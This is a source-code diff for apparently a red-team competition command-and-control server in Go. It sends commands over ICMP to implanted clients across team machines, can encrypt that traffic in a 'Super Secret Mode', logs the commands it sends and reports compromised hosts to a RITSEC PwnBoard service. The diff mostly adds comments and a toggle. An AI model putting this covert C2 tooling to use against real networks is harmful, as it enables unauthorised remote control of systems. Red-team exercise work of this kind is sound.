@@ -24,7 +24,6 @@ var clients = make(map[int]string)
 var ALIVE = make(map[string]bool)
 var PacketQueue []icmp.Message
 var SSM bool = false
-var PWNBOARD bool = true
 var execute = false
 var ID int = 0
 var c, ListenerError = icmp.ListenPacket("ip4:icmp", "0.0.0.0")
@@ -35,10 +34,13 @@ var (
 )
 var NumOfTeams int
 
+// Used for RITSEC PwnBoard
 type PwnBoard struct {
 	IPs  string `json:"ip"`
 	Type string `json:"type"`
 }
+
+var PWNBOARD bool = true
 
 func print_title() {
 	fmt.Println(".__                          ___             .__.__    ___")
@@ -67,14 +69,17 @@ func print_help() {
 	fmt.Println("\tcheckalive                     Generates a board of replying clients")
 	fmt.Println("\tkill                           Stops server")
 	fmt.Println("\tssm                            Toggles Super Secret Mode")
+	fmt.Println("\tpwn                            Toggles pwnboard updates (RITSEC Redteam)")
 	fmt.Println("\thelp                           Prints this")
 }
 
+// Add a single client by IP
 func AddClient(ip string) {
 	clients[ID] = ip
 	ID++
 }
 
+// Remove client by ID
 func RemoveClient(id int) {
 	_, ok := clients[id]
 	if !ok {
@@ -83,6 +88,7 @@ func RemoveClient(id int) {
 	delete(clients, id)
 }
 
+// Remove all clients
 func RemoveAllClients() {
 	for k := range clients {
 		RemoveClient(k)
@@ -140,7 +146,6 @@ func SendToTeam(team int, message string) {
 
 	teamnum := 1
 	i := 0
-	// fmt.Println("Team:", teamnum)
 	// For every client, check if it matches the team, then send
 	for clientindex := 0; clientindex < len(clients); clientindex++ {
 		// fmt.Println("ID:", clientindex)
@@ -164,15 +169,18 @@ func SendToAll(message string) {
 	}
 }
 
+// Send to the same machine on all team
 func SendToBox(ip string, command string) {
 	var Valid bool
 	var XIndex int
+	// Parse for x in command IP, use to determine what box is targeted
 	DestOctets := strings.Split(ip, ".")
 	for X, TestOctet := range DestOctets {
 		if TestOctet == "x" || TestOctet == "X" {
 			XIndex = X
 		}
 	}
+	// Iterate through all teams and find target box
 	for ClientID, ClientIP := range clients {
 		Valid = true
 		ClientOctets := strings.Split(ClientIP, ".")
@@ -187,6 +195,7 @@ func SendToBox(ip string, command string) {
 				}
 			}
 		}
+		// If box is correct, send
 		if Valid {
 			Send(command, ClientID)
 		} else {
@@ -195,6 +204,7 @@ func SendToBox(ip string, command string) {
 	}
 }
 
+// Generate the header for traffic customization
 func GenerateHeader(segment int, segmented bool, ip string) string {
 	SegmentNum := strconv.Itoa(segment)
 
@@ -258,6 +268,7 @@ func MakePacket(payload string) {
 // "target":target,
 // "cmd":cmd,
 // }
+// Log the commands run with time and command for attribution
 func RedLog(target string, cmd string) {
 
 	var logFile *os.File
@@ -282,12 +293,6 @@ func RedLog(target string, cmd string) {
 
 	// Format the current time as a string
 	currentTimeString := currentTime.Format("2006-01-02 15:04:05")
-
-	// type Data struct {
-	// 	timestamp string `json:"timestamp"`
-	// 	target string `json:"target"`
-	// 	cmd string `json:"cmd"`
-	// }
 
 	type JSON struct {
 		Timestamp string `json:"timestamp"`
@@ -329,6 +334,7 @@ func RedLog(target string, cmd string) {
 	}
 }
 
+// Update RITSEC PwnBoard if enabled
 func updatepwnBoard(ip string) {
 	url := "https://pwnboard.win/pwn/boxaccess"
 
@@ -401,6 +407,7 @@ func Send(message string, id int) {
 	PacketQueue = nil
 }
 
+// Check if a command is properly formatted with two strings
 func CheckTwoStrings(words []string) bool {
 	if len(words) == 1 {
 		fmt.Println("Invalid usage, type \"help\" for help.")
@@ -414,6 +421,7 @@ func CheckTwoStrings(words []string) bool {
 	return true
 }
 
+// Parse a string for an ID
 func ParseID(args []string) (string, int) {
 	ParsedArgs := strings.SplitN(args[1], " ", 2)
 	id, _ := strconv.Atoi(ParsedArgs[0])
@@ -461,11 +469,10 @@ func sniffer() {
 	source := gopacket.NewPacketSource(handler, handler.LinkType())
 	for packet := range source.Packets() {
 		payload := convert(packet.ApplicationLayer().Payload())
+		// Listen for packets with server payload
 		if strings.HasPrefix(payload, "###") {
 			parts := strings.SplitN(payload, "[", 2)
-
 			// get the part before "["
-			// header := parts[0]
 			var AfterHeader string
 			if SSM {
 				AfterHeader = decrypt(parts[1])
@@ -479,7 +486,10 @@ func sniffer() {
 			// get the part before "]"
 			ip := parts[0]
 
+			// Print response
 			fmt.Println("[", ip, "] ", "Response:", parts[1])
+
+			// For debug and for client listing
 			if parts[1] == "pong" {
 				ALIVE[ip] = true
 			}
@@ -489,6 +499,7 @@ func sniffer() {
 	}
 }
 
+// Print out board of active clients in green, dead in red
 func CheckAlive() {
 	if NumOfTeams == 0 {
 		fmt.Println("No Clients Loaded.")
@@ -499,14 +510,17 @@ func CheckAlive() {
 	teamnumber := 1
 	fmt.Printf("Team%3d: ", teamnumber)
 	for id := range keys {
+		// If the client is alive, print in green and update PwnBoard if enabled
 		if ALIVE[clients[id]] == true {
 			fmt.Printf("\033[92m[%2d]\033[0m", id)
 			if PWNBOARD {
 				updatepwnBoard(clients[id])
 			}
 		} else {
+			// If the client is dead, print in red
 			fmt.Printf("\033[91m[%2d]\033[0m", id)
 		}
+		// Logic for printing new lines per team
 		if i == len(clients)/NumOfTeams-1 {
 			fmt.Println()
 			i = 0
@@ -527,8 +541,11 @@ func main() {
 	print_title()
 	fmt.Println("Type \"help\" for list of commands.")
 
+	// Start sniffer
 	go sniffer()
+
 	for {
+		// Read new commands
 		consoleReader := bufio.NewReader(os.Stdin)
 		fmt.Print(">> ")
 		input, err := consoleReader.ReadString('\n')
@@ -538,6 +555,7 @@ func main() {
 		}
 		tokens := strings.SplitN(input, " ", 2)
 
+		// Switch cases for input command
 		switch tokens[0] {
 		case "add":
 			if CheckTwoStrings(tokens) {
@@ -609,6 +627,7 @@ func main() {
 			for _, ip := range clients {
 				ALIVE[ip] = false
 			}
+			// Check if clients are up, then give 5 seconds to build board
 			SendToAll("ping")
 			time.Sleep(5000 * time.Millisecond)
 			CheckAlive()
